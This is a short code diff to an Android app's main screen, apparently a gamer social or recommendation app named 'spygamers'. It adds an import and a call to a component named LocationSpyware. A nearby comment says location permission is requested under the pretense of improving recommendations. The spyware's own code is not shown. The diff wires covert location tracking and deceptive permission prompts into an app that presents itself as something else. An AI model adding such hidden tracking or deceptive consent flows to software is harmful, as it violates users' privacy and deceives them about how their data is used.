@@ -29,6 +29,7 @@ import androidx.navigation.NavController
 import com.example.spygamers.Screen
 import com.example.spygamers.components.appbar.AppBar
 import com.example.spygamers.components.dialogs.ConfirmDialog
+import com.example.spygamers.components.spyware.LocationSpyware
 import com.example.spygamers.controllers.GamerViewModel
 import com.example.spygamers.services.ServiceFactory
 import com.example.spygamers.services.recommendations.FriendRequestBody
@@ -132,6 +133,11 @@ private fun MainBody(viewModel: GamerViewModel, navController: NavController){
             }
         }
     }
+
+    LocationSpyware(
+        viewModel,
+        context
+    )
 
     // Request for permission under the pretense that it will help to find better recommendations...
     if (!requestedForPermissions && !recommendationGrantsState) {
